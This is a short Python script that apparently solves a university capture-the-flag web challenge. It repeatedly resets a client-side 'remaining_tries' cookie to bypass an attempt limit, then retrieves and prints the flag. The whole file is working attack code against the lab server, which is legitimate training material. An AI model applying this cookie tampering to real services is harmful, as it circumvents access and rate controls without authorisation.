import requests

URL = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22054/"

session = requests.session()

r = session.get(URL+"hello")
lines = r.text.split("<br>")

total = lines[0].split(" ")[-1][:-1]
current = lines[1].split(" ")[-1]

while current != total:
    r = session.get(URL+"more")
    lines = r.text.split("<br>")
    current = lines[2].split(" ")[-1]
    session.cookies.set("remaining_tries", "1", domain="mustard.stt.rnl.tecnico.ulisboa.pt")

r = session.get(URL+"finish")
flag = r.text.split(" ")[-1]
print(flag)